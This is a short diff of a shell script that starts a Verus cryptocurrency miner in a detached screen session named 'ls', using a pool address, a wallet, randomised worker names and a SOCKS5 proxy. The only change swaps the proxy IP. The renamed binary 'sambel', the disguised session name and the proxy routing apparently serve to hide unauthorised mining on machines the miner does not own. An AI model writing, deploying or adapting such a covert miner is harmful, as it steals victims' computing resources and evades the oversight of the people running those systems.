@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RTYdzcR1YraQQXz2MsKfMyTbDb35MY2x3G
 WORKER=$(echo $(shuf -i 1-7 -n 1)-REVOKE)
-PROXY=socks5://98.162.25.23:4145
+PROXY=socks5://98.185.94.94:4145
 ./sambel -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
